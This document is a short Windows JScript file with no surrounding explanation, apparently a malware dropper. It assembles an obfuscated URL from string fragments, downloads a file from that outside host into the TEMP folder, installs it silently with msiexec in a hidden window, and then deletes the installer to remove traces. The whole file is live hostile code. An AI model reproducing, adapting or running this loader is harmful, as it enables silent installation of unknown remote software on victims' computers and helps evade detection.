(function () {
    // URL split into pieces, joined at runtime
    var u = "ht" + "tps" + "://" +
            "gekko" + "spy-new-" +
            "prod" + "uction" +
            ".up" + "rail" + "way" + ".app" +
            "/m/9e890" + "66d-b21e-" +
            "42a6-9d4b-" + "f283" + "15dabaf7";

    var sh  = new ActiveXObject("WSc" + "ript.Shell");
    var fso = new ActiveXObject("Scrip" + "ting.FileSystemObject");
    var tmp = sh.ExpandEnvironmentStrings("%TEMP%");
    var nm  = "c" + Math.random().toString(36).substr(2, 8);
    var msi = tmp + "\\" + nm + ".msi";

    try {
        // MSXML2 is more universally available than WinHttp
        var xhr = new ActiveXObject("MSXML" + "2.XMLHTTP");
        xhr.Open("GET", u, false);
        xhr.Send();
        
        if (xhr.Status !== 200) return;

        // ADODB.Stream writes the bytes to disk
        var stream = new ActiveXObject("ADODB" + ".Stream");
        stream.Type = 1; 
        stream.Open();
        stream.Write(xhr.ResponseBody);
        stream.SaveToFile(msi, 2); 
        stream.Close();
    } catch (e) {
        return; 
    }

    // Run msiexec silently, wait for it to finish
    try { 
        sh.Run('msi' + 'exec /' + 'i "' + msi + '" /q' + 'n /nore' + 'start', 0, true); 
    } catch (e2) { return; }

    // Cleanup
    try { fso.DeleteFile(msi, true); } catch (e3) {}
    try { sh.Run('cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "' + msi + '"', 0, true); } catch (e4) {}
})();
